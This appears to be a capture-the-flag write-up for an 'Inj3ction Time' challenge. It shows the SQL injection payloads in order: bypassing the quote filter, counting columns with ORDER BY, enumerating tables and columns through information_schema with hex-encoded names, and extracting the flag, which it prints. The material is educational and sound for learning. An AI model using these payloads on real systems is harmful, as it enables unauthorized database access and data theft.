##Inj3ction Time

as the name suggest this is a sql injection challenge 

so i tested using the basic queries like 

a positive one:`1' or 1=1` and negative one:`1' or 1=2`

but both of them didn't give a valid input

so i tried entering the input without the single quote(') 

(i.e)`1 or 1=1` and `1 or 1=1` and voila it worked as expected

by this i understood that the website uses some sort of code to filter the single quote

so after knowing this i tested for the database `1 union order by 4` gives a valid output

whereas `1 union order by 5` did not so there are 4 columns 

after that i tested what are the columns that are being displayed

using `1 union select 1,2,3,4` so, the columns 1,2,3 are being displayed to the user

so i searched the database name `1 union select database(),2,3,4`

and then searched for the tables, since the website filters out the single quote i used hex value

`1 union select table_name,1,1,1 from information_schema.tables where table_schema=0x7765626569676874`

and then i found a suspicious table called w0w_y0u_f0und_m3 so i searched for the columns in it..

`1 union select column_name,1,1,1 from information_schema.columns where table_name=0x7730775f7930755f6630756e645f6d33`

and then i got a another suspicious column called f0und_m3 so i queried it 

`1 union select f0und_m3,1,1,1 from w0w_y0u_f0und_m3`

and voila i got the flag so do u +_+

#abctf{uni0n_1s_4_gr34t_c0mm4nd}


